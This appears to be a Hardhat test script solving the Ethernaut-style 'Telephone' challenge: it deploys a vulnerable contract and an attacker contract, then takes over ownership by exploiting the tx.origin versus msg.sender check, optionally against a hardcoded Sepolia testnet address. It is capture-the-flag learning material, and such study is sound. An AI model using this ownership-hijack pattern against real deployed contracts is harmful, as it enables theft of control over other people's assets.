import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { HackTelephone__factory, Telephone__factory } from "../../typechain-types/factories/security/Telephone.sol";
import { HackTelephone, Telephone } from "../../typechain-types/security/Telephone.sol";
import { createWallet, tx2contract } from "../sdk";
const hre = require('hardhat');

describe("Hack Telephone", function () {
  this.timeout(6000000);

  let owner: SignerWithAddress;
  let c : Telephone
  let hc : HackTelephone

  before(async () => {
    const signers = await ethers.getSigners()
    owner = signers[0];
    console.log("owner : ", owner.address)

  });

  it("Deploy CoinFlip", async function () {
		if (hre.hardhatArguments.network == undefined) {
      c = await new Telephone__factory(owner).deploy()
      console.log("c address : ", c.address)
    }
  });

  it("Deploy HackCoinFlip", async function () {
    let COINFLIP_CONTRACT_ADDR
		if (hre.hardhatArguments.network == undefined) {
      COINFLIP_CONTRACT_ADDR = c.address
    } else {
      COINFLIP_CONTRACT_ADDR = "0x8398452eDbc45A425bd91C6c0d0BFfcE2881bA97"
    }
    hc = await new HackTelephone__factory(owner).deploy(COINFLIP_CONTRACT_ADDR)
    console.log("hc address : ", hc.address)
  });

  it("tx.origin != msg.sender", async function () {
    let signer = owner

    async function tx() {
      
      const abi = [
        "function changeOwner(address) external"
      ]
    
      const TX_VALUE = ethers.utils.parseEther("0")
      const TX_GAS_LIMIT = BigInt(1000000)
      await tx2contract(
        hc.address,
        abi,
        "changeOwner",
        [signer.address],
        signer,
        TX_VALUE.toBigInt(),
        TX_GAS_LIMIT
      )
    }

    await tx()

		if (hre.hardhatArguments.network == undefined) {
      expect(await c.owner()).eq(signer.address)
    }
  });

});



// Test : yarn hardhat test test/security/*.ts --network sepolia